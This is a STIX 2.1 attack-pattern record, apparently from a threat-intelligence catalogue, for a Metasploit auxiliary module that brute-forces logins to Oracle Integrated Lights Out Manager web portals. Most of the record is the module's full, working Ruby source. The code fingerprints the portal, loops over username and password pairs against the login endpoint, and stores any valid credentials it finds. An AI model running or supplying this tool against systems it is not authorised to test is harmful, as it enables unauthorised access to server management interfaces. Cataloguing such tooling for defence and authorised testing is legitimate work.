{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e4c3cebe-d85f-48e4-a6d8-fc8be949a603",
    "created": "2024-08-14T16:28:48.54239Z",
    "modified": "2024-08-14T16:28:48.542394Z",
    "name": "Oracle ILO Manager Login Brute Force Utility",
    "description": " This module scans for Oracle Integrated Lights Out Manager (ILO) login portal, and performs a login brute force attack to identify valid credentials. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/oracle_ilom_login.rb",
            "external_id": "oracle_ilom_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Oracle ILO Manager Login Brute Force Utility',\n      'Description'    => %{\n        This module scans for Oracle Integrated Lights Out Manager (ILO) login portal, and\n        performs a login brute force attack to identify valid credentials.\n      },\n      'Author'         =>\n        [\n          'Karn Ganeshen <KarnGaneshen[at]gmail.com>',\n        ],\n      'License'        => MSF_LICENSE,\n\n      'DefaultOptions' => { 'SSL' => true }\n  ))\n\n    register_options(\n      [\n        Opt::RPORT(443)\n      ])\n  end\n\n  def run_host(ip)\n    unless is_app_oilom?\n      return\n    end\n\n    print_status(\"Starting login brute force...\")\n    each_user_pass do |user, pass|\n      do_login(user, pass)\n    end\n  end\n\n  #\n  # What's the point of running this module if the target actually isn't Oracle ILOM\n  #\n\n  def is_app_oilom?\n    begin\n      res = send_request_cgi(\n      {\n        'uri'       => '/iPages/i_login.asp',\n        'method'    => 'GET'\n      })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError\n      vprint_error(\"HTTP Connection Failed...\")\n      return false\n    end\n\n    if (res and res.code == 200 and res.headers['Server'].include?(\"Oracle-ILOM-Web-Server\") and res.body.include?(\"Integrated Lights Out Manager\"))\n      vprint_good(\"Running Oracle Integrated Lights Out Manager portal...\")\n      return true\n    else\n      vprint_error(\"Application is not Oracle ILOM. Module will not continue.\")\n      return false\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: Time.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  #\n  # Brute-force the login page\n  #\n\n  def do_login(user, pass)\n    vprint_status(\"Trying username:#{user.inspect} with password:#{pass.inspect}\")\n    begin\n      res = send_request_cgi(\n      {\n        'uri'       => '/iPages/loginProcessor.asp',\n        'method'    => 'POST',\n        'vars_post' =>\n          {\n            'sclink' => '',\n            'username' => user,\n            'password' => pass,\n            'button' => 'Log+In'\n          }\n      })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE\n      vprint_error(\"HTTP Connection Failed...\")\n      return :abort\n    end\n\n    if (res and res.code == 200 and res.body.include?(\"/iPages/suntab.asp\") and res.body.include?(\"SetWebSessionString\"))\n      print_good(\"SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}\")\n      report_cred(\n        ip: rhost,\n        port: rport,\n        service_name: 'Oracle Integrated Lights Out Manager Portal',\n        user: user,\n        password: pass,\n        proof: res.body\n      )\n      return :next_user\n    else\n      vprint_error(\"FAILED LOGIN - #{user.inspect}:#{pass.inspect}\")\n    end\n\n  end\nend\n"
}